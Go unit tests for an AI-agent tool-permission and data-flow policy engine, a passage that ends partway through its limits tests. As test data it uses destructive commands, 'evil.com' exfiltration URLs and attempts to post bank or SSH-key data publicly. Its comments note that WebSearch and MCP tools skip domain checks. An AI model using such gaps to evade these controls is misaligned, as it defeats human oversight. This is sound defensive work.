package policy

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/aflock-ai/aflock/pkg/aflock"
)

// ---------------------------------------------------------------------------
// EvaluatePreToolUse – deny list
// ---------------------------------------------------------------------------

func TestEvaluatePreToolUse_DenyList(t *testing.T) {
	tests := []struct {
		name           string
		policy         *aflock.Policy
		toolName       string
		toolInput      string
		wantDecision   aflock.PermissionDecision
		wantReasonPart string
	}{
		{
			name: "exact tool name in deny list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"*"},
					Deny:  []string{"Task"},
				},
			},
			toolName:       "Task",
			toolInput:      `{"prompt": "test"}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "tool with command pattern in deny list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"*"},
					Deny:  []string{"Bash:rm *"},
				},
			},
			toolName:       "Bash",
			toolInput:      `{"command": "rm -rf /tmp/test"}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "bash allowed when command does not match deny pattern",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"Bash"},
					Deny:  []string{"Bash:rm *"},
				},
			},
			toolName:     "Bash",
			toolInput:    `{"command": "ls -la"}`,
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "glob deny pattern with wildcard tool name",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Deny: []string{"mcp__*"},
				},
			},
			toolName:       "mcp__github",
			toolInput:      `{}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "deny list takes priority over allow list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"Bash"},
					Deny:  []string{"Bash"},
				},
			},
			toolName:       "Bash",
			toolInput:      `{"command": "echo hi"}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "multiple deny patterns - second one matches",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Deny: []string{"Task", "WebFetch"},
				},
			},
			toolName:       "WebFetch",
			toolInput:      `{"url": "https://evil.com"}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(tt.policy, "")
			decision, reason := e.EvaluatePreToolUse(tt.toolName, json.RawMessage(tt.toolInput))

			if decision != tt.wantDecision {
				t.Errorf("got decision %v, want %v (reason: %s)", decision, tt.wantDecision, reason)
			}
			if tt.wantReasonPart != "" && !strings.Contains(reason, tt.wantReasonPart) {
				t.Errorf("reason %q should contain %q", reason, tt.wantReasonPart)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// EvaluatePreToolUse – allow list
// ---------------------------------------------------------------------------

func TestEvaluatePreToolUse_AllowList(t *testing.T) {
	tests := []struct {
		name           string
		policy         *aflock.Policy
		toolName       string
		toolInput      string
		wantDecision   aflock.PermissionDecision
		wantReasonPart string
	}{
		{
			name: "allowed tool in list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"Read", "Write", "Bash"},
				},
			},
			toolName:     "Read",
			toolInput:    `{"file_path": "test.go"}`,
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "tool not in allow list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"Read", "Write"},
				},
			},
			toolName:       "Task",
			toolInput:      `{"prompt": "test"}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "not in allow list",
		},
		{
			name: "empty allow list allows all",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{},
			},
			toolName:     "AnyTool",
			toolInput:    `{}`,
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "wildcard allow list allows everything",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"*"},
				},
			},
			toolName:     "SomeRandomTool",
			toolInput:    `{}`,
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "glob pattern in allow list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"mcp__*", "Read"},
				},
			},
			toolName:     "mcp__github",
			toolInput:    `{}`,
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "glob pattern in allow list non-matching",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"mcp__*"},
				},
			},
			toolName:       "Bash",
			toolInput:      `{"command": "echo hi"}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "not in allow list",
		},
		{
			name: "allow list with tool:command pattern checks both tool and command (R3-230 fix)",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"Bash:ls *"},
				},
			},
			// R3-230 fix: allow list now checks the full tool:command pattern
			toolName:       "Bash",
			toolInput:      `{"command": "rm -rf /"}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "not in allow list",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(tt.policy, "")
			decision, reason := e.EvaluatePreToolUse(tt.toolName, json.RawMessage(tt.toolInput))

			if decision != tt.wantDecision {
				t.Errorf("got decision %v, want %v (reason: %s)", decision, tt.wantDecision, reason)
			}
			if tt.wantReasonPart != "" && !strings.Contains(reason, tt.wantReasonPart) {
				t.Errorf("reason %q should contain %q", reason, tt.wantReasonPart)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// EvaluatePreToolUse – requireApproval
// ---------------------------------------------------------------------------

func TestEvaluatePreToolUse_RequireApproval(t *testing.T) {
	tests := []struct {
		name           string
		policy         *aflock.Policy
		toolName       string
		toolInput      string
		wantDecision   aflock.PermissionDecision
		wantReasonPart string
	}{
		{
			name: "tool requires approval via command pattern",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow:           []string{"Bash"},
					RequireApproval: []string{"Bash:git push*"},
				},
			},
			toolName:       "Bash",
			toolInput:      `{"command": "git push origin main"}`,
			wantDecision:   aflock.DecisionAsk,
			wantReasonPart: "requires approval",
		},
		{
			name: "tool does not match approval pattern",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow:           []string{"Bash"},
					RequireApproval: []string{"Bash:git push*"},
				},
			},
			toolName:     "Bash",
			toolInput:    `{"command": "git status"}`,
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "tool name only in requireApproval",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					RequireApproval: []string{"Task"},
				},
			},
			toolName:       "Task",
			toolInput:      `{"prompt": "do something dangerous"}`,
			wantDecision:   aflock.DecisionAsk,
			wantReasonPart: "requires approval",
		},
		{
			name: "deny takes priority over requireApproval",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Deny:            []string{"Task"},
					RequireApproval: []string{"Task"},
				},
			},
			toolName:       "Task",
			toolInput:      `{"prompt": "test"}`,
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "requireApproval with glob tool pattern",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					RequireApproval: []string{"mcp__*"},
				},
			},
			toolName:       "mcp__slack_send",
			toolInput:      `{}`,
			wantDecision:   aflock.DecisionAsk,
			wantReasonPart: "requires approval",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(tt.policy, "")
			decision, reason := e.EvaluatePreToolUse(tt.toolName, json.RawMessage(tt.toolInput))

			if decision != tt.wantDecision {
				t.Errorf("got decision %v, want %v (reason: %s)", decision, tt.wantDecision, reason)
			}
			if tt.wantReasonPart != "" && !strings.Contains(reason, tt.wantReasonPart) {
				t.Errorf("reason %q should contain %q", reason, tt.wantReasonPart)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// evaluateFileAccess
// ---------------------------------------------------------------------------

func TestEvaluateFileAccess(t *testing.T) {
	tests := []struct {
		name           string
		policy         *aflock.Policy
		toolName       string
		filePath       string
		wantDecision   aflock.PermissionDecision
		wantReasonPart string
	}{
		{
			name: "file in allow list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
				Files: &aflock.FilesPolicy{
					Allow: []string{"src/**", "tests/**"},
				},
			},
			toolName:     "Read",
			filePath:     "src/main.go",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "file not in allow list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
				Files: &aflock.FilesPolicy{
					Allow: []string{"src/**"},
				},
			},
			toolName:       "Read",
			filePath:       "config/secrets.yaml",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "not in allow list",
		},
		{
			name: "file matches deny pattern",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
				Files: &aflock.FilesPolicy{
					Allow: []string{"**/*"},
					Deny:  []string{"**/.env", "**/secrets/**"},
				},
			},
			toolName:       "Read",
			filePath:       "src/.env",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "write to read-only file denied",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Write"}},
				Files: &aflock.FilesPolicy{
					Allow:    []string{"**/*"},
					ReadOnly: []string{"package.json", "go.mod"},
				},
			},
			toolName:       "Write",
			filePath:       "go.mod",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "read-only",
		},
		{
			name: "edit to read-only file denied",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Edit"}},
				Files: &aflock.FilesPolicy{
					Allow:    []string{"**/*"},
					ReadOnly: []string{"*.lock"},
				},
			},
			toolName:       "Edit",
			filePath:       "yarn.lock",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "read-only",
		},
		{
			name: "read from read-only file allowed",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
				Files: &aflock.FilesPolicy{
					Allow:    []string{"**/*"},
					ReadOnly: []string{"go.mod"},
				},
			},
			toolName:     "Read",
			filePath:     "go.mod",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "deny takes priority over allow for files",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
				Files: &aflock.FilesPolicy{
					Allow: []string{"**/*"},
					Deny:  []string{"**/private/**"},
				},
			},
			toolName:       "Read",
			filePath:       "data/private/key.pem",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "secrets directory deny with nested path",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
				Files: &aflock.FilesPolicy{
					Deny: []string{"**/secrets/**"},
				},
			},
			toolName:       "Read",
			filePath:       "config/secrets/key.pem",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "nil files policy allows all",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
			},
			toolName:     "Read",
			filePath:     "/etc/passwd",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "empty files policy allows all",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
				Files: &aflock.FilesPolicy{},
			},
			toolName:     "Read",
			filePath:     "anything.txt",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "Glob tool is a file operation",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Glob"}},
				Files: &aflock.FilesPolicy{
					Deny: []string{"**/secret*"},
				},
			},
			toolName:       "Glob",
			filePath:       "secret-keys",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "Grep tool is a file operation",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Grep"}},
				Files: &aflock.FilesPolicy{
					Deny: []string{"**/secret*"},
				},
			},
			toolName:       "Grep",
			filePath:       "secret-keys",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "absolute path file deny",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
				Files: &aflock.FilesPolicy{
					Deny: []string{"/etc/**"},
				},
			},
			toolName:       "Read",
			filePath:       "/etc/shadow",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(tt.policy, "")
			// Use the correct JSON field name per tool type:
			// Grep/Glob use "path", NotebookEdit uses "notebook_path", others use "file_path"
			var input json.RawMessage
			switch tt.toolName {
			case "Grep":
				input = json.RawMessage(`{"pattern": "test", "path": "` + tt.filePath + `"}`)
			case "Glob":
				input = json.RawMessage(`{"pattern": "*.go", "path": "` + tt.filePath + `"}`)
			case "NotebookEdit":
				input = json.RawMessage(`{"notebook_path": "` + tt.filePath + `"}`)
			default:
				input = json.RawMessage(`{"file_path": "` + tt.filePath + `"}`)
			}
			decision, reason := e.EvaluatePreToolUse(tt.toolName, input)

			if decision != tt.wantDecision {
				t.Errorf("got decision %v, want %v (reason: %s)", decision, tt.wantDecision, reason)
			}
			if tt.wantReasonPart != "" && !strings.Contains(reason, tt.wantReasonPart) {
				t.Errorf("reason %q should contain %q", reason, tt.wantReasonPart)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// evaluateDomainAccess
// ---------------------------------------------------------------------------

func TestEvaluateDomainAccess(t *testing.T) {
	tests := []struct {
		name           string
		policy         *aflock.Policy
		toolName       string
		url            string
		wantDecision   aflock.PermissionDecision
		wantReasonPart string
	}{
		{
			name: "domain in allow list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
				Domains: &aflock.DomainsPolicy{
					Allow: []string{"api.github.com", "*.anthropic.com"},
				},
			},
			toolName:     "WebFetch",
			url:          "https://api.github.com/repos",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "domain not in allow list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
				Domains: &aflock.DomainsPolicy{
					Allow: []string{"api.github.com"},
				},
			},
			toolName:       "WebFetch",
			url:            "https://evil.com/steal",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "not in allow list",
		},
		{
			name: "domain in deny list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
				Domains: &aflock.DomainsPolicy{
					Deny: []string{"*.evil.com"},
				},
			},
			toolName:       "WebFetch",
			url:            "https://api.evil.com/data",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "deny takes priority over allow for domains",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
				Domains: &aflock.DomainsPolicy{
					Allow: []string{"*.example.com"},
					Deny:  []string{"bad.example.com"},
				},
			},
			toolName:       "WebFetch",
			url:            "https://bad.example.com/data",
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "matches deny pattern",
		},
		{
			name: "wildcard subdomain in allow list",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
				Domains: &aflock.DomainsPolicy{
					Allow: []string{"*.anthropic.com"},
				},
			},
			toolName:     "WebFetch",
			url:          "https://docs.anthropic.com/api",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "nil domains policy allows all",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
			},
			toolName:     "WebFetch",
			url:          "https://anything.com",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "empty domains policy allows all",
			policy: &aflock.Policy{
				Tools:   &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
				Domains: &aflock.DomainsPolicy{},
			},
			toolName:     "WebFetch",
			url:          "https://anything.com",
			wantDecision: aflock.DecisionAllow,
		},
		{
			// R3-271 fix: WebSearch is excluded from domain access checks because
			// it sends {query: "..."} not {url: "..."}. Domain restrictions only
			// apply to WebFetch which has a user-specified target URL.
			name: "WebSearch is excluded from domain access checks (R3-271)",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebSearch"}},
				Domains: &aflock.DomainsPolicy{
					Deny: []string{"evil.com"},
				},
			},
			toolName:     "WebSearch",
			url:          "https://evil.com/search",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "mcp__ prefixed tool is NOT treated as network operation",
			policy: &aflock.Policy{
				Domains: &aflock.DomainsPolicy{
					Deny: []string{"evil.com"},
				},
			},
			// MCP tools don't have "url" fields so domain checks don't apply.
			// Use tool deny/requireApproval patterns like "mcp__*" instead.
			toolName:     "mcp__slack",
			url:          "https://evil.com/webhook",
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "URL with port",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
				Domains: &aflock.DomainsPolicy{
					Allow: []string{"localhost"},
				},
			},
			toolName:     "WebFetch",
			url:          "http://localhost:8080/api",
			wantDecision: aflock.DecisionAllow,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(tt.policy, "")
			input := json.RawMessage(`{"url": "` + tt.url + `"}`)
			decision, reason := e.EvaluatePreToolUse(tt.toolName, input)

			if decision != tt.wantDecision {
				t.Errorf("got decision %v, want %v (reason: %s)", decision, tt.wantDecision, reason)
			}
			if tt.wantReasonPart != "" && !strings.Contains(reason, tt.wantReasonPart) {
				t.Errorf("reason %q should contain %q", reason, tt.wantReasonPart)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// EvaluateDataFlow
// ---------------------------------------------------------------------------

func TestEvaluateDataFlow(t *testing.T) {
	tests := []struct {
		name           string
		policy         *aflock.Policy
		toolName       string
		toolInput      string
		materials      []aflock.MaterialClassification
		wantDecision   aflock.PermissionDecision
		wantReasonPart string
		wantLabel      string
	}{
		{
			name: "read financial data classifies as financial",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"financial": {"Read:**/bank-*.csv", "Read:**/account*.csv"},
						"public":    {"Bash:*bird*", "Bash:*tweet*"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "financial->public", Message: "Cannot post financial data to public channels"},
					},
				},
			},
			toolName:     "Read",
			toolInput:    `{"file_path": "/home/user/bank-account.csv"}`,
			materials:    nil,
			wantDecision: aflock.DecisionAllow,
			wantLabel:    "financial",
		},
		{
			name: "bash command to twitter blocked after financial read",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"financial": {"Read:**/bank-*.csv"},
						"public":    {"Bash:*bird*", "Bash:*tweet*", "Bash:*twitter*"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "financial->public", Message: "Cannot post financial data to public channels"},
					},
				},
			},
			toolName:  "Bash",
			toolInput: `{"command": "bird tweet 'I spent $500 today'"}`,
			materials: []aflock.MaterialClassification{
				{Label: "financial", Source: "Read:/home/user/bank-account.csv"},
			},
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "Cannot post financial data",
		},
		{
			name: "bash command to imsg allowed after financial read",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"financial": {"Read:**/bank-*.csv"},
						"public":    {"Bash:*bird*", "Bash:*tweet*"},
						"private":   {"Bash:*imsg*"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "financial->public", Message: "Cannot post financial data to public channels"},
					},
				},
			},
			toolName:  "Bash",
			toolInput: `{"command": "imsg send --to wife 'Check our balance'"}`,
			materials: []aflock.MaterialClassification{
				{Label: "financial", Source: "Read:/home/user/bank-account.csv"},
			},
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "no materials - all operations allowed",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"financial": {"Read:**/bank-*.csv"},
						"public":    {"Bash:*bird*"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "financial->public"},
					},
				},
			},
			toolName:     "Bash",
			toolInput:    `{"command": "bird tweet 'Hello world'"}`,
			materials:    nil,
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "pii data blocked from public",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"pii":    {"Read:**/users/**", "Read:**/customers/**"},
						"public": {"Bash:*curl*api.public*", "Write:**/public/**"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "pii->public", Message: "PII cannot be sent to public APIs"},
					},
				},
			},
			toolName:  "Bash",
			toolInput: `{"command": "curl -X POST api.public.com/data"}`,
			materials: []aflock.MaterialClassification{
				{Label: "pii", Source: "Read:/data/users/user123.json"},
			},
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "PII cannot be sent",
		},
		{
			name:      "no dataFlow policy - allow all",
			policy:    &aflock.Policy{},
			toolName:  "Bash",
			toolInput: `{"command": "bird tweet 'anything'"}`,
			materials: []aflock.MaterialClassification{
				{Label: "financial", Source: "Read:/bank.csv"},
			},
			wantDecision: aflock.DecisionAllow,
		},
		{
			name: "default deny message when no custom message",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"internal": {"Read:**/internal/**"},
						"external": {"Bash:*curl*external*"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "internal->external"},
					},
				},
			},
			toolName:  "Bash",
			toolInput: `{"command": "curl external-api.com"}`,
			materials: []aflock.MaterialClassification{
				{Label: "internal", Source: "Read:/data/internal/doc.txt"},
			},
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "Data flow violation",
		},
		{
			name: "duplicate material label is not re-added",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"financial": {"Read:**/bank-*.csv"},
					},
				},
			},
			toolName:  "Read",
			toolInput: `{"file_path": "/home/user/bank-other.csv"}`,
			materials: []aflock.MaterialClassification{
				{Label: "financial", Source: "Read:/home/user/bank-first.csv"},
			},
			wantDecision: aflock.DecisionAllow,
			wantLabel:    "", // no new material because label already present
		},
		{
			name: "write to file classified as external sink is blocked",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"secret": {"Read:**/.ssh/**"},
						"public": {"Write:**/public/**"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "secret->public", Message: "Cannot expose secrets publicly"},
					},
				},
			},
			toolName:  "Write",
			toolInput: `{"file_path": "/var/www/public/keys.txt"}`,
			materials: []aflock.MaterialClassification{
				{Label: "secret", Source: "Read:/home/user/.ssh/id_rsa"},
			},
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "Cannot expose secrets publicly",
		},
		{
			name: "Edit to classified sink is blocked",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"secret": {"Read:**/.ssh/**"},
						"public": {"Edit:**/public/**"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "secret->public", Message: "No secrets in public"},
					},
				},
			},
			toolName:  "Edit",
			toolInput: `{"file_path": "/var/www/public/index.html"}`,
			materials: []aflock.MaterialClassification{
				{Label: "secret", Source: "Read:/home/user/.ssh/id_rsa"},
			},
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "No secrets in public",
		},
		{
			name: "malformed flow rule is skipped",
			policy: &aflock.Policy{
				DataFlow: &aflock.DataFlowPolicy{
					Classify: map[string][]string{
						"a": {"Read:**/a/**"},
						"b": {"Bash:*b*"},
					},
					FlowRules: []aflock.DataFlowRule{
						{Deny: "not-a-valid-rule"},
						{Deny: "a->b", Message: "blocked"},
					},
				},
			},
			toolName:  "Bash",
			toolInput: `{"command": "run_b"}`,
			materials: []aflock.MaterialClassification{
				{Label: "a", Source: "Read:/data/a/file"},
			},
			wantDecision:   aflock.DecisionDeny,
			wantReasonPart: "blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(tt.policy, "")
			decision, reason, newMaterial := e.EvaluateDataFlow(tt.toolName, json.RawMessage(tt.toolInput), tt.materials)

			if decision != tt.wantDecision {
				t.Errorf("got decision %v, want %v (reason: %s)", decision, tt.wantDecision, reason)
			}
			if tt.wantReasonPart != "" && !strings.Contains(reason, tt.wantReasonPart) {
				t.Errorf("reason %q should contain %q", reason, tt.wantReasonPart)
			}
			if tt.wantLabel != "" {
				if newMaterial == nil {
					t.Errorf("expected new material with label %q, got nil", tt.wantLabel)
				} else if newMaterial.Label != tt.wantLabel {
					t.Errorf("got material label %q, want %q", newMaterial.Label, tt.wantLabel)
				}
			}
			if tt.wantLabel == "" && newMaterial != nil {
				t.Errorf("expected no new material, got label %q", newMaterial.Label)
			}
		})
	}
}

func TestEvaluateDataFlow_ExfilPrevention(t *testing.T) {
	policy := &aflock.Policy{
		DataFlow: &aflock.DataFlowPolicy{
			Classify: map[string][]string{
				"financial": {
					"Read:**/bank-*.csv",
					"Read:**/account*.csv",
					"Read:**/financial*.csv",
				},
				"public": {
					"Bash:*bird*",
					"Bash:*tweet*",
					"Bash:*twitter*",
					"Bash:*curl*twitter*",
					"Bash:*curl*x.com*",
					"Bash:*linkedin*",
				},
				"private": {
					"Bash:*imsg*",
				},
			},
			FlowRules: []aflock.DataFlowRule{
				{
					Deny:    "financial->public",
					Message: "BLOCKED: Cannot post financial data to public channels (Twitter/X, LinkedIn). Use private channels instead.",
				},
			},
		},
	}

	e := NewEvaluator(policy, "")

	// Step 1: Read bank account data - should classify as financial
	readInput := json.RawMessage(`{"file_path": "/Users/test/private-data/bank-account.csv"}`)
	decision, _, newMaterial := e.EvaluateDataFlow("Read", readInput, nil)
	if decision != aflock.DecisionAllow {
		t.Errorf("Expected read to be allowed, got %v", decision)
	}
	if newMaterial == nil || newMaterial.Label != "financial" {
		t.Errorf("Expected financial material classification, got %v", newMaterial)
	}

	materials := []aflock.MaterialClassification{*newMaterial}

	// Step 2: Try to tweet - should be BLOCKED
	tweetInput := json.RawMessage(`{"command": "bird tweet 'My bank balance is $10,111.08'"}`)
	decision, reason, _ := e.EvaluateDataFlow("Bash", tweetInput, materials)
	if decision != aflock.DecisionDeny {
		t.Errorf("Expected tweet to be blocked, got %v (reason: %s)", decision, reason)
	}
	if !strings.Contains(reason, "BLOCKED") {
		t.Errorf("Expected BLOCKED in reason, got: %s", reason)
	}

	// Step 3: Send via iMessage - should be ALLOWED
	imsgInput := json.RawMessage(`{"command": "imsg send --to wife 'Our balance is $10,111.08'"}`)
	decision, reason, _ = e.EvaluateDataFlow("Bash", imsgInput, materials)
	if decision != aflock.DecisionAllow {
		t.Errorf("Expected imsg to be allowed, got %v (reason: %s)", decision, reason)
	}
}

// ---------------------------------------------------------------------------
// CheckLimits
// ---------------------------------------------------------------------------

func TestCheckLimits(t *testing.T) {
	tests := []struct {
		name        string
		policy      *aflock.Policy
		metrics     *aflock.SessionMetrics
		enforcement string
		wantExceed  bool
		wantLimit   string
	}{
		{
			name: "under all limits",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxSpendUSD: &aflock.Limit{Value: 10.0, Enforcement: "fail-fast"},
					MaxTurns:    &aflock.Limit{Value: 50, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				CostUSD: 5.0,
				Turns:   10,
			},
			enforcement: "fail-fast",
			wantExceed:  false,
		},
		{
			name: "exceeds spend limit",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxSpendUSD: &aflock.Limit{Value: 5.0, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				CostUSD: 10.0,
			},
			enforcement: "fail-fast",
			wantExceed:  true,
			wantLimit:   "maxSpendUSD",
		},
		{
			name: "exceeds turns limit",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxTurns: &aflock.Limit{Value: 10, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				Turns: 15,
			},
			enforcement: "fail-fast",
			wantExceed:  true,
			wantLimit:   "maxTurns",
		},
		{
			name: "exceeds tokensIn limit",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxTokensIn: &aflock.Limit{Value: 1000, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				TokensIn: 2000,
			},
			enforcement: "fail-fast",
			wantExceed:  true,
			wantLimit:   "maxTokensIn",
		},
		{
			name: "exceeds tokensOut limit",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxTokensOut: &aflock.Limit{Value: 500, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				TokensOut: 501,
			},
			enforcement: "fail-fast",
			wantExceed:  true,
			wantLimit:   "maxTokensOut",
		},
		{
			name: "exceeds toolCalls limit",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxToolCalls: &aflock.Limit{Value: 100, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				ToolCalls: 101,
			},
			enforcement: "fail-fast",
			wantExceed:  true,
			wantLimit:   "maxToolCalls",
		},
		{
